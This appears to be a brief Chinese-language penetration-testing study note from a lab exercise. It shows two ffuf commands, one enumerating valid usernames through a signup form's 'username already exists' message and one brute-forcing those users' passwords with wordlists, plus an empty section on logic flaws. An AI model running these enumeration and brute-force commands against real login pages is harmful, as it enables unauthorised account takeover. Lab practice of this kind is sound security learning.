### 一、越权
1. 爆破
```shell
    # 利用注册信息的反馈，确认存在的用户
    ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.226.236/customers/signup -mr "username already exists"
    # 对个别用户进行密码爆破
    ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.226.236/customers/login -fc 200
```

2. 逻辑漏洞
```shell

```